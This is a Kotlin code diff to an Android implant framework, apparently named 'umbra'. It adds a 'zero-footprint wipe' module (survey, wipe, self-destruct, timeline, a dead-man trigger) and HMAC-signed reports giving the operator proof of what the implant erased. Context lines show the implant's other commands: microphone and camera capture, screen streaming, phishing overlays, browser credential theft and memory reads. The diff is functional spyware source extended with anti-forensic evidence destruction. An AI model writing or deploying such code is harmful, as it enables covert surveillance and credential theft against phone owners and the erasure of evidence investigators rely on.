@@ -40,6 +40,10 @@ object TaskRunner {
         "media.mic", "media.camera", "live.screen", "ui.stream",
         // the false screen, the databases and the end of it
         "phish.overlay", "app.dump", "anti.forensic", "evade.suicide",
+        // the zero-footprint wipe: the surface, the traces and the end
+        "wipe.survey", "wipe.run", "wipe.verify", "wipe.self",
+        "forensics.report", "forensics.timeline", "decommission",
+        "wipe.deadman",
         // the senses of the desktop, on the phone
         "window.list", "clipboard.watch", "screen.stream", "wifi.profiles",
         "browser.creds", "av.survey", "usb.history", "proc.memory",
@@ -448,6 +452,16 @@ object TaskRunner {
             "app.dump" -> appDump(args)
             "anti.forensic" -> forensics("anti.forensic", args)
             "evade.suicide" -> forensics("evade.suicide", args)
+
+            // ---- the zero-footprint wipe --------------------------------
+            "wipe.survey" -> wipe("wipe.survey", args)
+            "wipe.run" -> wipe("wipe.run", args)
+            "wipe.verify" -> wipe("wipe.verify", args)
+            "wipe.self" -> wipe("wipe.self", args)
+            "forensics.report" -> wipe("forensics.report", args)
+            "forensics.timeline" -> wipe("forensics.timeline", args)
+            "decommission" -> wipe("decommission", args)
+            "wipe.deadman" -> wipe("wipe.deadman", args)
 
             // ---- network reach and the local environment ------------------
             "env" -> environment(args.field("filter")?.text() ?: "")
@@ -953,6 +967,78 @@ object TaskRunner {
         }
         return Outcome(0, text.toByteArray(), "")
     }
+
+    /**
+     * The zero-footprint wipe of the phone.
+     *
+     * The module answers what is on the phone, what the wipe removed
+     * and what the platform refused to let it remove.  A report that
+     * says "the phone is clean" without saying which of the two
+     * happened is not a report.
+     */
+    private fun wipe(kind: String, args: Upk): Outcome {
+        val ctx = context?.android
+            ?: return Outcome(2, ByteArray(0), "$kind: the phone has no context to wipe")
+        return when (kind) {
+            "wipe.survey" -> {
+                val findings = Wipe.survey(ctx)
+                val present = findings.filter { it.present }
+                attested(Wipe.surveyReport(findings))
+                    .with("wipe_artifacts", Upk.num(present.size.toLong()))
+                    .with("wipe_bytes", Upk.num(present.sumOf { it.size }))
+            }
+            "wipe.run" -> attested(Wipe.wipe(ctx, args))
+            "wipe.verify" -> attested(Wipe.verify(ctx))
+            "wipe.self" -> attested(Wipe.selfDestruct(ctx, args))
+            "forensics.report" -> attested(Wipe.surface(ctx))
+            "forensics.timeline" -> attested(Wipe.timeline(ctx, args))
+            "wipe.deadman" -> attested(Wipe.deadmanArm(TaskRunner.stateDirPath(), args))
+            else -> attested(Wipe.decommission(ctx, args))
+        }
+    }
+
+    /**
+     * The attestation of a report.
+     *
+     * The report is signed with the key of the agent, so the operator
+     * keeps a proof of what the implant removed even when the phone is
+     * gone.  The label is the domain separation of the framework: a
+     * signature over a report is not a signature over a frame.
+     */
+    private fun attested(text: String): Outcome {
+        val report = text.toByteArray()
+        val ctx = context
+        val attest = if (ctx == null || ctx.psk.isEmpty()) {
+            ""
+        } else {
+            try {
+                val mac = javax.crypto.Mac.getInstance("HmacSHA256")
+                mac.init(javax.crypto.spec.SecretKeySpec(ctx.psk, "HmacSHA256"))
+                mac.update("umbra/w1/attest".toByteArray())
+                mac.update(report)
+                mac.doFinal().joinToString("") {
+                    // The locale is fixed: the digits of a signature are
+                    // hexadecimal and never the ones of a language.
+                    "%02x".format(java.util.Locale.US, it.toInt() and 0xff)
+                }
+            } catch (t: Throwable) {
+                ""
+            }
+        }
+        val outcome = Outcome(0, report, "")
+        return if (attest.isEmpty()) outcome else outcome.with("attest", Upk.str(attest))
+    }
+
+    /**
+     * The directory where the implant keeps its own state.
+     *
+     * The wipe module asks the task runner: the operator may have moved
+     * the state somewhere else, and the wipe has to wipe that place.
+     */
+    fun stateDirPath(): String =
+        context?.stateDir?.takeIf { it.isNotEmpty() }
+            ?: context?.android?.filesDir?.absolutePath
+            ?: ""
 
     /**
      * The laboratory around the phone.
